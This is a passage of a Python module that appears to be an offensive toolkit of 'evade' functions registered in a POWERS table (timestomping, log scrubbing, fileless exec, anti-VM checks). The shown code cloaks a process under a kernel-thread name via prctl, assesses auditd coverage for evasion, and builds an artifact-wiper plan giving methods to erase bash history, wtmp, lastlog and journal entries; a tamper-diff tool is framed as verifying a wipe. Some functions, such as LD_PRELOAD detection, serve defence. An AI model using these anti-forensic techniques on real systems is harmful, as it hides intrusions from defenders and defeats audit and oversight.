    """REAL: fork a child that prctl(PR_SET_NAME)-cloaks itself; parent verifies via /proc/<pid>/comm."""
    r = _base("proc_name_cloak")
    new_name = str(args.get("name", "kworker/u8:2"))[:15]  # TASK_COMM_LEN-1
    if not hasattr(os, "fork"):
        r["error"] = "fork unavailable on this platform"
        return r
    rd, wr = os.pipe()
    pid = os.fork()
    if pid == 0:
        try:
            os.close(rd)
            libc = ctypes.CDLL(None, use_errno=True)
            with open("/proc/self/comm") as f:
                orig = f.read().strip()
            rc = libc.prctl(15, new_name.encode(), 0, 0, 0)  # PR_SET_NAME
            with open("/proc/self/comm") as f:
                now = f.read().strip()
            os.write(wr, json.dumps({"orig_comm": orig, "prctl_rc": rc,
                                     "new_comm": now}).encode())
            time.sleep(0.6)  # stay alive so parent can observe from outside
        finally:
            os._exit(0)
    os.close(wr)
    data = os.read(rd, 4096)
    os.close(rd)
    child = json.loads(data.decode())
    # independent observation while child still sleeps
    observed = {}
    for f in ("comm", "stat"):
        try:
            txt = _read_text("/proc/%d/%s" % (pid, f))
            observed[f] = txt.strip()[:80] if f == "stat" else txt.strip()
        except OSError as e:
            observed[f] = "gone: %s" % e
    os.waitpid(pid, 0)
    r["ok"] = True
    r["child_pid"] = pid
    r["child_report"] = child
    r["parent_observed"] = observed
    r["name"] = new_name
    r["note"] = ("comm (ps top-level name) is now %r; full cmdline still shows the "
                 "real argv — hiding that needs overwriting argv memory or "
                 "PR_SET_MM; tools reading /proc/<pid>/cmdline or exe see through "
                 "a comm-only cloak" % new_name)
    return r


_IN_EVENT_NAMES = [
    (0x00000100, "IN_CREATE"), (0x00000200, "IN_DELETE"),
    (0x00000008, "IN_MODIFY"), (0x00000040, "IN_MOVED_FROM"),
    (0x00000080, "IN_MOVED_TO"), (0x00000001, "IN_ACCESS"),
    (0x00000002, "IN_MODIFY"), (0x00000004, "IN_ATTRIB"),
]


def nm20_evade_inotify_watch(args):
    """REAL: ctypes inotify watch on a /tmp dir; performs create/modify/delete probe ops and decodes events."""
    r = _base("inotify_watch")
    watch_dir = args.get("path") or os.path.join(TMPDIR, "nm20_inotify_demo")
    if not _under_tmp(watch_dir):
        r["error"] = "watch path must be under %s (got %r)" % (TMPDIR, watch_dir)
        return r
    os.makedirs(watch_dir, exist_ok=True)
    libc = ctypes.CDLL(None, use_errno=True)
    fd = libc.inotify_init1(os.O_NONBLOCK)
    if fd < 0:
        r["error"] = "inotify_init1 failed: %s" % os.strerror(ctypes.get_errno())
        return r
    mask = 0x100 | 0x200 | 0x08 | 0x40 | 0x80  # CREATE|DELETE|MODIFY|MOVED_FROM|MOVED_TO
    wd = libc.inotify_add_watch(fd, os.fsencode(watch_dir), mask)
    if wd < 0:
        r["error"] = "inotify_add_watch failed: %s" % os.strerror(ctypes.get_errno())
        os.close(fd)
        return r
    try:
        # probe operations against ourselves so the watch demonstrably fires
        probe = os.path.join(watch_dir, "nm20_probe.tmp")
        with open(probe, "w") as f:
            f.write("stage1")
        with open(probe, "a") as f:
            f.write("stage2")
        moved = probe + ".moved"
        os.rename(probe, moved)
        os.unlink(moved)
        rl, _, _ = select.select([fd], [], [], 2.0)
        events = []
        if rl:
            buf = os.read(fd, 65536)
            off = 0
            while off + 16 <= len(buf):
                ev_wd, ev_mask, cookie, nlen = struct.unpack_from("iIII", buf, off)
                name = buf[off + 16:off + 16 + nlen].rstrip(b"\x00").decode(
                    "utf-8", "replace")
                names = [n for bit, n in _IN_EVENT_NAMES if ev_mask & bit]
                events.append({"wd": ev_wd, "mask": ev_mask, "cookie": cookie,
                               "events": names, "name": name})
                off += 16 + nlen
        r["ok"] = True
        r["watch_dir"] = watch_dir
        r["wd"] = wd
        r["events"] = events
        r["event_count"] = len(events)
        r["note"] = ("same primitive auditbeat/Fanotify-based FIM uses; an evader "
                     "can act between IN_MODIFY and a userspace daemon's scan — "
                     "kernel audit (auditd) or eBPF closes that race")
    finally:
        os.close(fd)
    return r


# ---------------------------------------------------------------------------
# REAL audit/forensic surface reports
# ---------------------------------------------------------------------------

def nm20_evade_auditd_evasion_report(args):
    """REAL: check auditd/kauditd presence, auditctl availability, and rule dump (honest about root need)."""
    r = _base("auditd_evasion_report")
    procs = []
    try:
        for pid in os.listdir("/proc"):
            if not pid.isdigit():
                continue
            try:
                comm = _read_text("/proc/%s/comm" % pid).strip()
            except OSError:
                continue
            if comm in ("auditd", "kauditd", "auditbeat", "go-audit"):
                procs.append({"pid": int(pid), "comm": comm})
    except OSError as e:
        r["proc_scan_error"] = str(e)
    r["audit_processes"] = procs
    r["auditctl_path"] = shutil.which("auditctl")
    log = "/var/log/audit/audit.log"
    r["audit_log"] = {"path": log, "exists": os.path.exists(log)}
    if os.path.exists(log):
        try:
            st = os.stat(log)
            r["audit_log"].update({"size": st.st_size, "mtime": st.st_mtime})
        except OSError as e:
            r["audit_log"]["stat_error"] = str(e)
    if r["auditctl_path"]:
        rc, out, err = _run(["auditctl", "-s"], timeout=5)
        r["auditctl_status"] = {"rc": rc, "stdout": out.strip()[:500],
                                "stderr": err.strip()[:300]}
        rc2, out2, err2 = _run(["auditctl", "-l"], timeout=5)
        r["auditctl_rules"] = {"rc": rc2, "rules": out2.splitlines()[:50],
                               "stderr": err2.strip()[:300]}
        if rc != 0 or rc2 != 0:
            r["note"] = ("auditctl needs root/CAP_AUDIT_CONTROL; rc!=0 output above "
                         "is the honest failure, not absence of auditing")
    else:
        r["note"] = "auditctl not installed"
    kauditd = any(p["comm"] == "kauditd" for p in procs)
    userspace = any(p["comm"] != "kauditd" for p in procs)
    r["kernel_audit_thread"] = kauditd
    r["userspace_audit_daemon"] = userspace
    if not kauditd and not userspace:
        r["evasion_assessment"] = ("no audit framework visible: syscall-level events "
                                   "(execve, open, ptrace) are NOT being recorded")
    elif kauditd and not userspace:
        r["evasion_assessment"] = ("kernel audit thread runs but nothing consumes "
                                   "events — rules may exist yet alerts go nowhere")
    else:
        r["evasion_assessment"] = ("active auditing: evasion requires rule gaps, "
                                   "not daemon absence; check auditctl_rules output")
    r["ok"] = True
    return r


def nm20_evade_log_presence_audit(args):
    """REAL: enumerate which classic forensic log files exist here, with size/mtime/readability."""
    r = _base("log_presence_audit")
    paths = ["/var/log/auth.log", "/var/log/secure", "/var/log/syslog",
             "/var/log/messages", "/var/log/wtmp", "/var/log/btmp",
             "/var/log/lastlog", "/var/log/audit/audit.log",
             "/var/log/journal", "/var/log/faillog",
             "/run/utmp", "/var/run/utmp"]
    home = os.path.expanduser("~")
    for t in (".bash_history", ".zsh_history", ".python_history", ".lesshst",
              ".viminfo", ".ssh/known_hosts", ".ssh/authorized_keys"):
        paths.append(os.path.join(home, t))
    rows = []
    for p in paths:
        row = {"path": p, "exists": os.path.exists(p)}
        if row["exists"]:
            try:
                st = os.stat(p)
                row.update({"size": st.st_size, "mtime": st.st_mtime,
                            "mtime_iso": time.strftime("%Y-%m-%dT%H:%M:%S",
                                                       time.localtime(st.st_mtime)),
                            "is_dir": stat.S_ISDIR(st.st_mode),
                            "readable": os.access(p, os.R_OK),
                            "writable": os.access(p, os.W_OK)})
            except OSError as e:
                row["stat_error"] = str(e)
        rows.append(row)
    r["ok"] = True
    r["logs"] = rows
    r["present"] = sum(1 for x in rows if x["exists"])
    r["writable"] = [x["path"] for x in rows
                     if x.get("exists") and x.get("writable")]
    r["note"] = ("anything in 'writable' can be tampered with as this user; "
                 "read-only-but-present entries still leak you to whoever CAN "
                 "read them")
    return r


def nm20_evade_ldpreload_detect(args):
    """REAL: detect LD_PRELOAD-style hiding — env vars, /etc/ld.so.preload, deleted/odd libs in own maps."""
    r = _base("ldpreload_detect")
    r["env"] = {k: v for k, v in os.environ.items()
                if k in ("LD_PRELOAD", "LD_LIBRARY_PATH", "LD_AUDIT",
                         "LD_DEBUG", "DYLD_INSERT_LIBRARIES")}
    preload = "/etc/ld.so.preload"
    r["ld_so_preload"] = {"path": preload, "exists": os.path.exists(preload)}
    if os.path.exists(preload):
        try:
            r["ld_so_preload"]["content"] = _read_text(preload).strip()[:500]
        except OSError as e:
            r["ld_so_preload"]["read_error"] = str(e)
    suspicious, deleted = [], []
    std_prefixes = ("/lib", "/usr/lib", "/usr/local/lib", "/etc", "/proc",
                    "/sys", "/dev", "/run", "/snap", "[")
    try:
        seen = set()
        for ln in _read_text("/proc/self/maps").splitlines():
            parts = ln.split()
            if len(parts) < 6:
                continue
            p = parts[5]
            if p in seen:
                continue
            seen.add(p)
            if p.endswith(" (deleted)"):
                deleted.append(p)
            elif p.endswith(".so") and not p.startswith(std_prefixes):
                suspicious.append(p)
    except OSError as e:
        r["maps_error"] = str(e)
    r["deleted_mapped_files"] = deleted[:30]
    r["nonstandard_lib_paths"] = suspicious[:30]
    findings = []
    if r["env"]:
        findings.append("LD_* env vars set: %s" % ",".join(sorted(r["env"])))
    if r["ld_so_preload"]["exists"]:
        findings.append("/etc/ld.so.preload present")
    if deleted:
        findings.append("%d mapped-but-deleted files (classic injected/rootkit sign)"
                        % len(deleted))
    r["findings"] = findings
    r["preload_hiding_suspected"] = bool(findings)
    r["ok"] = True
    return r


_ACTION_ARTIFACTS = {
    "ssh_login": ["/var/log/auth.log", "/var/log/secure", "/var/log/wtmp",
                  "/var/log/btmp", "/var/log/lastlog", "/run/utmp",
                  "/var/log/journal", "~/.ssh/known_hosts"],
    "shell_command": ["~/.bash_history", "~/.zsh_history", "~/.python_history",
                      "~/.lesshst", "~/.viminfo", "/var/log/journal",
                      "/var/log/audit/audit.log"],
    "file_download": ["~/.wget-hsts", "~/Downloads", "/var/log/syslog",
                      "/tmp", "~/.bash_history"],
    "sudo": ["/var/log/auth.log", "/var/log/secure", "/var/log/journal",
             "/var/log/audit/audit.log", "~/.bash_history"],
    "package_install": ["/var/log/dpkg.log", "/var/log/apt/history.log",
                        "/var/log/yum.log", "/var/log/dnf.log",
                        "/var/log/journal"],
}

_WIPE_DIFFICULTY = {
    ".bash_history": ("trivial", "truncate + 'history -c'; also unset HISTFILE"),
    "wtmp": ("hard", "binary struct utmp; needs utmp-aware editor, not sed"),
    "btmp": ("hard", "binary struct utmp; failed-login trail lives here"),
    "lastlog": ("hard", "sparse binary; lastlog shows 'last login' on next ssh"),
    "journal": ("very hard", "append-sealed binary journal; vacuuming leaves gaps "
                "and journal has its own FSS sealing keys"),
    "audit.log": ("very hard", "if auditd runs, edits are themselves audited; "
                   "remote syslog forwarding defeats local wipes entirely"),
    "utmp": ("medium", "live sessions visible in 'who'; edit while session active"),
}


def nm20_evade_artifact_wiper_plan(args):
    """REAL: enumerate the forensic artifacts an action leaves, checking each path's real presence."""
    r = _base("artifact_wiper_plan")
    action = str(args.get("action", "shell_command"))
    paths = _ACTION_ARTIFACTS.get(action)
    r["action"] = action
    if paths is None:
        r["error"] = "unknown action %r; known: %s" % (
            action, ", ".join(sorted(_ACTION_ARTIFACTS)))
        r["ok"] = True
        return r
    home = os.path.expanduser("~")
    plan = []
    for p in paths:
        full = p.replace("~", home, 1) if p.startswith("~") else p
        base = os.path.basename(p)
        diff, method = _WIPE_DIFFICULTY.get(base, ("medium",
                                                   "truncate/edit with matching "
                                                   "format awareness"))
        entry = {"path": full, "exists": os.path.exists(full),
                 "wipe_difficulty": diff, "method": method}
        if entry["exists"]:
            try:
                st = os.stat(full)
                entry["size"] = st.st_size
                entry["writable"] = os.access(full, os.W_OK)
                entry["is_dir"] = stat.S_ISDIR(st.st_mode)
            except OSError as e:
                entry["stat_error"] = str(e)
        plan.append(entry)
    r["ok"] = True
    r["plan"] = plan
    r["present_count"] = sum(1 for e in plan if e["exists"])
    r["hard_truth"] = ("local wipes never erase: (1) remote syslog/siem copies, "
                       "(2) network-flow records, (3) filesystem journal/slack "
                       "copies of the logs themselves, (4) memory of the sshd/auditd "
                       "that wrote them")
    return r


def _hash_tree(root, max_files, max_bytes):
    files = {}
    skipped = 0
    for dirpath, dirnames, filenames in os.walk(root, followlinks=False):
        dirnames.sort()
        for fn in sorted(filenames):
            if len(files) >= max_files:
                return files, skipped + 1, True
            full = os.path.join(dirpath, fn)
            try:
                st = os.lstat(full)
            except OSError:
                skipped += 1
                continue
            if not stat.S_ISREG(st.st_mode):
                skipped += 1
                continue
            rel = os.path.relpath(full, root)
            if st.st_size > max_bytes:
                files[rel] = {"sha256": None, "size": st.st_size,
                              "mtime": st.st_mtime, "note": "too large to hash"}
                continue
            try:
                files[rel] = {"sha256": _sha256_file(full, max_bytes),
                              "size": st.st_size, "mtime": st.st_mtime}
            except OSError:
                skipped += 1
    return files, skipped, False


def nm20_evade_tamper_diff(args):
    """REAL: sha256-hash a directory tree into a /tmp baseline, or diff the tree against that baseline."""
    r = _base("tamper_diff")
    root = args.get("path", TMPDIR)
    if not os.path.isdir(root):
        r["error"] = "not a directory: %s" % root
        return r
    max_files = int(args.get("max_files", 5000))
    max_bytes = int(args.get("max_file_bytes", 16 * 1024 * 1024))
    baseline = args.get("baseline") or os.path.join(
        TMPDIR, "nm20_tamper_baseline_%s.json" %
        hashlib.sha256(os.path.abspath(root).encode()).hexdigest()[:12])
    t0 = time.time()
    current, skipped, truncated = _hash_tree(root, max_files, max_bytes)
    r["scan"] = {"root": root, "files": len(current), "skipped": skipped,
                 "truncated": truncated,
                 "elapsed_s": round(time.time() - t0, 3)}
    r["baseline"] = baseline
    if not os.path.exists(baseline) or args.get("rebaseline"):
        with open(baseline, "w") as f:
            json.dump({"root": root, "created": time.time(), "files": current}, f)
        r["ok"] = True
        r["mode"] = "baseline_created"
        r["note"] = "run again later without 'rebaseline' to diff against this"
        return r
    try:
        with open(baseline) as f:
            old = json.load(f)
    except (OSError, ValueError) as e:
        r["error"] = "baseline unreadable: %s" % e
        return r
    old_files = old.get("files", {})
    old_paths, new_paths = set(old_files), set(current)
    added = sorted(new_paths - old_paths)
    removed = sorted(old_paths - new_paths)
    changed = []
    for p in sorted(old_paths & new_paths):
        o, n = old_files[p], current[p]
        if o.get("sha256") != n.get("sha256") or o.get("size") != n.get("size"):
            changed.append({"path": p, "old_sha256": o.get("sha256"),
                            "new_sha256": n.get("sha256"),
                            "old_size": o.get("size"), "new_size": n.get("size"),
                            "mtime_changed": o.get("mtime") != n.get("mtime")})
    if args.get("update"):
        with open(baseline, "w") as f:
            json.dump({"root": root, "created": time.time(), "files": current}, f)
    r["ok"] = True
    r["mode"] = "diff"
    r["baseline_age_s"] = round(time.time() - old.get("created", time.time()), 1)
    r["added"] = added[:200]
    r["removed"] = removed[:200]
    r["changed"] = changed[:200]
    r["counts"] = {"added": len(added), "removed": len(removed),
                   "changed": len(changed)}
    r["note"] = ("same diff trick both ways: FIM uses it to catch tampering; an "
                 "evader runs it to verify a wipe left no unexpected new files")
    return r


POWERS = {
    "nm20.evade.timestomp": nm20_evade_timestomp,
    "nm20.evade.log_scrubber": nm20_evade_log_scrubber,
    "nm20.evade.shred_file": nm20_evade_shred_file,
    "nm20.evade.history_wipe_gen": nm20_evade_history_wipe_gen,
    "nm20.evade.anti_vm_check": nm20_evade_anti_vm_check,
    "nm20.evade.sandbox_detect": nm20_evade_sandbox_detect,
    "nm20.evade.debugger_detect": nm20_evade_debugger_detect,
    "nm20.evade.entropy_mixer_report": nm20_evade_entropy_mixer_report,
    "nm20.evade.stego_embed": nm20_evade_stego_embed,
    "nm20.evade.stego_extract": nm20_evade_stego_extract,
    "nm20.evade.cover_channel_gen": nm20_evade_cover_channel_gen,
    "nm20.evade.mount_hider_gen": nm20_evade_mount_hider_gen,
    "nm20.evade.fileless_exec_gen": nm20_evade_fileless_exec_gen,
    "nm20.evade.proc_name_cloak": nm20_evade_proc_name_cloak,
    "nm20.evade.inotify_watch": nm20_evade_inotify_watch,
    "nm20.evade.auditd_evasion_report": nm20_evade_auditd_evasion_report,
    "nm20.evade.log_presence_audit": nm20_evade_log_presence_audit,
    "nm20.evade.ldpreload_detect": nm20_evade_ldpreload_detect,
    "nm20.evade.artifact_wiper_plan": nm20_evade_artifact_wiper_plan,
    "nm20.evade.tamper_diff": nm20_evade_tamper_diff,
}

if __name__ == "__main__":
    print(json.dumps(POWERS["nm20.evade.anti_vm_check"]({}), indent=2,
                     default=str))
